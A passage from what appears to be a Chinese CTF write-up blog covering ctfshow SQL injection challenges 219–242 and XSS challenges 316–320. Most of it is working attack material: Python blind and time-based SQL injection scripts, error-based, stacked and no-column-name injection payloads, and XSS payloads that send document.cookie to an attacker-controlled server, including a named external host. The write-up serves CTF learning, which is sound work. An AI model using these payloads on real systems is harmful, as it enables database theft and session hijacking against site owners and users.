punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token comment">#'ip': f'1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))=\'&#123;j&#125;\'),(SELECT count(*) FROM information_schema.columns A,information_schema.columns B),1)#',</span>                <span class="token comment">#'ip': f'1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagxc"),&#123;i&#125;,1))=\'&#123;j&#125;\'),(benchmark(20000000,sha(1))),1)#',</span>                <span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1) or if(((substr((select group_concat(flagaac) from ctfshow_flagxc),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=\'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">\'),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#'</span></span><span class="token punctuation">,</span>                <span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>                <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>219</strong></p><p>过滤了rlike，笛卡尔积依然可用，同上即可</p><p><strong>220</strong></p><p>sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr</p><p>真能滤，换left</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ee633dfd-4a05-4685-bbf6-1da4b5fc4d1d.challenge.ctf.show&#x2F;api&#x2F;&quot;flagchar &#x3D; &quot;ctfshow-&#123;&#125;,abde1234567890&quot;namechar &#x3D; &quot;flag,ctfshow_qwertyuiopasdfghjklzxcvbnm&quot;flag&#x3D;&quot;&quot;for k in range(10):    print()    flag &#x3D; &quot;&quot;    for i in range(1, 50):        for j in flagchar:            tmp&#x3D;flag+j            data &#x3D; &#123;                &#39;ip&#39;: f&#39;1) or if((left((select flagaabcc from ctfshow_flagxcac),&#123;i&#125;)&#x3D;\&#39;&#123;tmp&#125;\&#39;),(SELECT count(*) FROM information_schema.tables A,information_schema.tables B,information_schema.columns C),1)#&#39;,                &#39;debug&#39;: &#39;1&#39;            &#125;            try:                requests.post(url&#x3D;url, data&#x3D;data, timeout&#x3D;4)            except:                flag&#x3D;tmp                print(j,end&#x3D;&quot;&quot;)                break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>时间盲注，结束</p><p><strong>221</strong></p><p>limit注入，欢迎收看P神博客</p><p>报错注入</p><pre class="line-numbers language-none"><code class="language-none">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>222</strong></p><p>Group_by后面的参数来进行布尔注入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://debba94a-3e3c-4b9e-97e0-27c6e7381dde.challenge.ctf.show/api/?u="</span>ca<span class="token operator">=</span><span class="token string">"ctfshow&#123;1234567890-abcdef&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> ca<span class="token punctuation">:</span>        payload<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'if(substr((select group_concat(flagaabc) from ctfshow_flaga),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">","username",cot(0))'</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>223</strong></p><p>过滤了数字，贴个大佬脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Kradress</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl <span class="token operator">=</span> <span class="token string">"http://7702b56c-35d9-4b80-abdc-bb0956f4bce5.challenge.ctf.show/api/"</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token builtin">dict</span><span class="token operator">=</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token operator">+</span><span class="token string">"_-,&#125;&#123;"</span><span class="token comment"># 爆表名  </span><span class="token comment"># payload = "select group_concat(table_name) from information_schema.tables where table_schema=database()"</span><span class="token comment"># 爆列名</span><span class="token comment"># payload = "select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_flagas'"</span><span class="token comment">#爆字段值</span>payload <span class="token operator">=</span> <span class="token string">"select flagasabc from ctfshow_flagas"</span><span class="token keyword">def</span> <span class="token function">numToStr</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>numToStr2<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"concat(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token keyword">def</span> <span class="token function">numToStr2</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    parts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    n <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>        parts<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"true"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>parts<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>res<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>        params<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">'u'</span> <span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"concat(if(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>numToStr<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,true)=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>numToStr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">,username,cot(false)))#"</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>        <span class="token comment"># print(r.url)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span>j            <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>224</strong></p><p>通过文件信息的注入，这里有颖师傅的<span class="exturl"><a class="exturl__link"   href="https://blog.gem-love.com/ctf/2283.html" >博客</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><blockquote><p>但是发现这个<code>file()</code>方法可以检测图片的EXIF信息，而EXIF信息中有一个comment字段，相当于图片注释，而<code>finfo-&gt;file()</code>正好能够输出这个信息，如果上面的假设成立，这就可以造成SQL注入</p></blockquote><p>再到别的师傅那里去拿一个源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Return Code: "</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token number">10</span><span class="token operator">*</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"文件过大: "</span> <span class="token operator">.</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"size"</span><span class="token punctuation">]</span> <span class="token operator">/</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" Kb&lt;br />"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" already exists. "</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>      <span class="token punctuation">&#123;</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">".zip"</span><span class="token punctuation">;</span>      <span class="token variable">$filetype</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">finfo</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/image|png|bmap|jpg|jpeg|application|text|audio|video/i"</span><span class="token punctuation">,</span><span class="token variable">$filetype</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"file type error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"upload/"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO file(filename,filepath,filetype) VALUES ('"</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filepath</span><span class="token operator">.</span><span class="token string double-quoted-string">"','"</span><span class="token operator">.</span><span class="token variable">$filetype</span><span class="token operator">.</span><span class="token string double-quoted-string">"');"</span><span class="token punctuation">;</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>      <span class="token string double-quoted-string">"upload/"</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:filelist.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Error: "</span> <span class="token operator">.</span> <span class="token variable">$sql</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;br>"</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看到filetype变量确实通过finfo取了内容，我们本地跑一下</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302009630.png"></p><p>确实输出了部分的文件信息，看群里给的payload，使用的是bin文件，构造的文件部分内容被输出</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302053318.png"></p><p>上传拿shell即可</p><p>后记：似乎这里拿到的是file命令获取的内容</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202208302055956.png"></p><p><strong>225</strong></p><p>堆叠：</p><pre class="line-numbers language-none"><code class="language-none">prepare a from 0x十六进制语句;execute a;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>226</strong></p><p>同上</p><p><strong>227</strong></p><p>没查出来东西，看WP，通过查询<code>information_schema.routines</code>查看存储过程和函数</p><blockquote><p>存储过程（Stored Procedure）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。<br>存储过程是为了完成特定功能的SQL语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数(需要时)来调用执行。<br>存储过程思想上很简单，就是数据库 SQL 语言层面的代码封装与重用。</p></blockquote><p>就是存了已经定义好的函数，可以看到getFlag函数，也能看到flag，调用的话使用call getFlag就好</p><p><strong>228,229,230</strong></p><p>都是上面的</p><p><strong>231</strong></p><p>update开始，第一道题直接连着username一起改</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;0&#39;,username&#x3D;(select group_concat(flagas) from flaga where table_schema&#x3D;database())%23&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>232</strong></p><p>md5问题不大，多裹个括号就行</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;0&#39;),username&#x3D;(select group_concat(flagass) from flagaa)%23&amp;username&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>233</strong></p><p>似乎单引号消失了，转义然后和后面username的闭合就行</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass233) from flag233333)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>234</strong></p><p>单双一起，同上</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(flagass23s3) from flag23a)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>235</strong></p><p>无列名注入，看<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/qq_31620591/article/details/117067799" >这里</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;) from (select 1,2,3 union select * from flag23a1) as a)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>236</strong></p><p>多滤了个flag，没卵用</p><pre class="line-numbers language-none"><code class="language-none">password&#x3D;\&amp;username&#x3D;,username&#x3D;(select group_concat(&#96;2&#96;)  from (select 1,2,3 union select * from flaga) as a)%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>237</strong></p><p>进入insert环节，闭合，拿数据，插入</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;1&#39;,(select group_concat(flagass23s3) from flag))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>238</strong></p><p>没有空格用括号</p><pre class="line-numbers language-none"><code class="language-none">username&#x3D;1&#39;,(select(group_concat(flag))from(flagb)))%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>239</strong></p><p>又一个无列名，注不进去，也不知道哪里出问题了</p><p><strong>240</strong></p><p>有表名那不狠狠的爆破？</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> itertools<span class="token keyword">import</span> timeurl<span class="token operator">=</span><span class="token string">"http://6be0cd82-3931-4919-a3e1-bfdcd72e685a.challenge.ctf.show/api/insert.php"</span>s<span class="token operator">=</span><span class="token string">'ab'</span>a<span class="token operator">=</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">,</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token string">'ab'</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>    table<span class="token operator">=</span><span class="token string">'flag'</span><span class="token operator">+</span>i<span class="token punctuation">;</span>    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"1',(select(flag)from(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>table<span class="token punctuation">&#125;</span></span><span class="token string">)))#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span><span class="token string">'1'</span><span class="token punctuation">&#125;</span>    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>241</strong></p><p>开始删东西了，就20条，用时间盲注吧，脚本from yu师傅</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:yu22x</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parseurl <span class="token operator">=</span> <span class="token string">"http://b37e7121-22c6-4917-bfa5-ddc38a0ed78f.challenge.ctf.show/api/delete.php"</span>s<span class="token operator">=</span><span class="token string">'0123456789abcdef-'</span>flag<span class="token operator">=</span><span class="token string">'ctfshow&#123;'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f'0||if(substr((select flag from flag),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(1),0)'</span></span><span class="token punctuation">&#125;</span><span class="token comment">#print(data)</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>flag<span class="token operator">+=</span>j  <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token keyword">break</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>242</strong></p><p>进行一个文件的dump</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CTFshowXSS</title>
      <link href="/posts/36544.html"/>
      <url>/posts/36544.html</url>
      
        <content type="html"><![CDATA[<p>首先自己搭建或者找<span class="exturl"><a class="exturl__link"   href="https://xss8.cc/login/" >xss测试平台</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>还有<span class="exturl"><a class="exturl__link"   href="https://xss.pt/" >另一个</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p><strong>316</strong></p><pre class="line-numbers language-none"><code class="language-none">最简单的：&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;服务器IP&#x2F;?x&#x3D;&#39;document.cookie&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>317</strong></p><p>过滤了script</p><pre class="line-numbers language-none"><code class="language-none">&lt;body onload&#x3D;&quot;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;服务器IP&#x2F;?x&#x3D;&#39;+document.cookie&quot;&gt;&lt;&#x2F;body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>318</strong></p><p>过滤了img，使用iframe</p><pre class="line-numbers language-none"><code class="language-none">&lt;iframe WIDTH&#x3D;0 HEIGHT&#x3D;0 srcdoc&#x3D;。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#48;&amp;#120;&amp;#46;&amp;#97;&amp;#120;&amp;#47;&amp;#107;&amp;#48;&amp;#74;&amp;#106;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;&lt;BODYONLOAD&#x3D;document.location&#x3D;&#39;http:&#x2F;&#x2F;xss.darkflow.top?cookie&#x3D;&#39;+document.cookie;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>319</strong></p><p>同上即可</p><p><strong>320</strong></p><p>过滤了空格，script，用tab</p><pre class="line-numbers language-none"><code 